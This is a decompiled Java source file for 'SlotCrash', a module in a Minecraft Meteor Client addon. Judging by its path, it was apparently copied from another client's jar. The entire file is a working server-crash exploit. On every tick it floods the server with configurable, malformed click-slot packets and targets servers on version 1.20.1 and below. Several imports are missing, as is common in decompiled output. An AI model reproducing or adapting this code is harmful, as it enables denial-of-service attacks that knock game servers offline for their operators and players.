/*    */ package net.poodleschool.poodleclient.poodleclient.modules;
/*    */ import net.poodleschool.poodleclient.poodleclient.Addon;
/*    */ import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
/*    */ import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
/*    */ import meteordevelopment.meteorclient.events.game.GameLeftEvent;
/*    */ import meteordevelopment.meteorclient.settings.BoolSetting;
/*    */ import meteordevelopment.meteorclient.settings.EnumSetting;
/*    */ import meteordevelopment.meteorclient.settings.IntSetting;
/*    */ import meteordevelopment.meteorclient.settings.Setting;
/*    */ import meteordevelopment.meteorclient.settings.SettingGroup;
/*    */ import meteordevelopment.meteorclient.systems.modules.Module;
/*    */ import meteordevelopment.orbit.EventHandler;
/*    */ import net.minecraft.class_1713;
/*    */ import net.minecraft.class_1799;
/*    */ 
/*    */ public class SlotCrash extends Module {
/* 17 */   private final SettingGroup sgGeneral = this.settings.getDefaultGroup();
/*    */   
/* 19 */   private Setting<Integer> amount = this.sgGeneral.add((Setting)((IntSetting.Builder)((IntSetting.Builder)((IntSetting.Builder)(new IntSetting.Builder())
/* 20 */       .name("amount"))
/* 21 */       .description("How many packets?"))
/* 22 */       .defaultValue(Integer.valueOf(6)))
/* 23 */       .build());
/*    */ 
/*    */   
/* 26 */   private Setting<class_1713> type = this.sgGeneral.add((Setting)((EnumSetting.Builder)((EnumSetting.Builder)((EnumSetting.Builder)(new EnumSetting.Builder())
/* 27 */       .name("type"))
/* 28 */       .description("The Type of the Packet"))
/* 29 */       .defaultValue(class_1713.field_7791))
/* 30 */       .build());
/*    */ 
/*    */   
/* 33 */   private Setting<Integer> slotIndex = this.sgGeneral.add((Setting)((IntSetting.Builder)((IntSetting.Builder)((IntSetting.Builder)(new IntSetting.Builder())
/* 34 */       .name("slot-index"))
/* 35 */       .description("The slotIndex of the Packet"))
/* 36 */       .noSlider()
/* 37 */       .defaultValue(Integer.valueOf(36)))
/* 38 */       .build());
/*    */ 
/*    */   
/* 41 */   private Setting<Integer> button = this.sgGeneral.add((Setting)((IntSetting.Builder)((IntSetting.Builder)((IntSetting.Builder)(new IntSetting.Builder())
/* 42 */       .name("button"))
/* 43 */       .description("The button of the Packet"))
/* 44 */       .noSlider()
/* 45 */       .defaultValue(Integer.valueOf(-1)))
/* 46 */       .build());
/*    */ 
/*    */   
/* 49 */   private final Setting<Boolean> disableOnLeave = this.sgGeneral.add((Setting)((BoolSetting.Builder)((BoolSetting.Builder)((BoolSetting.Builder)(new BoolSetting.Builder())
/* 50 */       .name("disable-on-leave"))
/* 51 */       .description("Disables spam when you leave a server."))
/* 52 */       .defaultValue(Boolean.valueOf(true)))
/* 53 */       .build());
/*    */ 
/*    */   
/*    */   public SlotCrash() {
/* 57 */     super(Addon.CATEGORY, "slot-crash", "Works on 1.20.1 and below");
/*    */   }
/*    */ 
/*    */   
/*    */   public void onActivate() {
/* 62 */     super.onActivate();
/*    */   }
/*    */   
/*    */   @EventHandler
/*    */   public void onTick(TickEvent.Post e) {
/* 67 */     if (this.mc.field_1724 == null || this.mc.field_1724.field_7512 == null)
/*    */       return; 
/* 69 */     for (int i = 0; i < ((Integer)this.amount.get()).intValue(); i++) {
/* 70 */       Int2ObjectArrayMap<class_1799> map = new Int2ObjectArrayMap();
/* 71 */       map.put(0, new class_1799((class_1935)class_1802.field_8094, 1));
/* 72 */       this.mc.field_1724.field_3944.method_52787((class_2596)new class_2813(this.mc.field_1724.field_7512.field_7763, this.mc.field_1724.field_7512
/*    */             
/* 74 */             .method_37421(), ((Integer)this.slotIndex
/* 75 */             .get()).intValue(), ((Integer)this.button
/* 76 */             .get()).intValue(), (class_1713)this.type
/* 77 */             .get(), this.mc.field_1724.field_7512
/* 78 */             .method_34255().method_7972(), (Int2ObjectMap)map));
/*    */     } 
/*    */   }
/*    */ 
/*    */ 
/*    */   
/*    */   @EventHandler
/*    */   private void onGameLeft(GameLeftEvent event) {
/* 86 */     if (((Boolean)this.disableOnLeave.get()).booleanValue()) toggle(); 
/*    */   }
/*    */ }


/* Location:              /Users/iangoss/Downloads/navine-3.2.8.jar!/de/Jakob/navine/modules/SlotCrash.class
 * Java compiler version: 17 (61.0)
 * JD-Core Version:       1.1.3
 */